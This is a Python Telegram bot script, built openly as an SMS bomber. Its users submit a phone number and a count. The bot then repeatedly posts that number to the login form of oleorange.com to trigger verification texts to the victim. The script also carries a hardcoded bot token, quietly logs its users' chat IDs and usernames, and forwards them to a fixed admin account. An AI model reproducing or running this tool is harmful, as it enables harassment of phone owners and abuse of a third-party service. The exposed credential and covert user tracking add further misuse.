import requests
import telebot
from telebot import types
from time import sleep
import random
Done = 0
Error = 0
token = ('2006938852:AAGkjtZ6X3mSZsqEptJZGZInqg46xtqyte0')
bot = telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start(message):
    adminid = ["1515975662"]
    if message.chat.type == 'private':
        startsms = """
🏴‍☠ Hello In Bot </END GAME>
🕷 To Spam Any Numper
📤 Send ==> /sendsms
        """
        sent = bot.send_message(message.chat.id, text=startsms)
        users = open("users.py", "r")
        users = users.read()
        if str(message.chat.id) not in str(adminid):
            if str(message.chat.id) not in str(users):
                bot.send_message("1515975662", f"""
✈ Hello TTH New Users Joind
      👽 User --> @{message.chat.username} 
      🤖 id   --> {message.chat.id} """)
                users = open("users.py", "a")
                userswrite = str(message.chat.id), "==> ", str(message.chat.username)
                users.write(str(userswrite))
                users.write("")
#######################################################################
@bot.message_handler(commands=['sendsms'])
def sendsms(message):
        if message.chat.type == 'private':
            global Done,Error
            sendmessage = """
Welcom Back👋 , To Spam Send 📤
   ✅ Numper:Numper_of_SmS
   
🔰 Ex:
   ✅ 01256359875:10
        """
            bot.send_message(message.chat.id, text=sendmessage)
        @bot.message_handler(func=lambda message: True)
        def sendmessage(message):
            if "012" in str(message.text):
                try:
                    num = message.text.split(':')[0]
                    pass
                except:
                    bot.send_message(message.chat.id, "🛑 Error In Numper [?]")
                    pass
                try:
                    count = message.text.split(':')[1]
                except:
                    bot.send_message(message.chat.id, "🛑 Error In Msg [?]")
                hd = {
    "Host": "oleorange.com",
    "Connection": "keep-alive",
    "Content-Length": "427",
    "Cache-Control": "max-age\u003d0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://oleorange.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "Referer": "http://oleorange.com/login",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
  }
  
                url = 'http://oleorange.com/login'

                data = {
'__LASTFOCUS':'',
'__EVENTTARGET':'',
'__EVENTARGUMENT':'',
'__VIEWSTATE':'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
'__VIEWSTATEGENERATOR':'C2EE9ABB',
'__EVENTVALIDATION':'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
'txtPhone':num,
'btnLogin':'Access'
}

                try:
                    for i in range(int(count)):
                        r = requests.post(url, headers=hd, data=data).text
                        if 'rfvtxtVerificationCode' in r:
    	                    print('\x1b[1;99m• \x1b[1;92mDone Send Sms')
    	                    bot.send_message(message.chat.id, text='✅ Done Send SMS ☠', parse_mode='markdown')
    	                    pass

                        else:
                            bot.send_message(message.chat.id, text='❌ Sorry Donot Send Message ..❗', parse_mode='markdown')
                            pass
                except:
                    bot.send_message(message.chat.id, text="""
            Error You Donot Send Numper
            Send --> /sendsms Again""")
                    pass
@bot.message_handler(commands=['Users'])
def usersjoined(message):
    if str(message.chat.id) == "1515975662":
        users = open("users.py", "r")
        users = users.read()
        bot.send_message(message.chat.id, f"""
Hello Owner This Is Users And ID:
{users}
        """)







bot.polling(True)
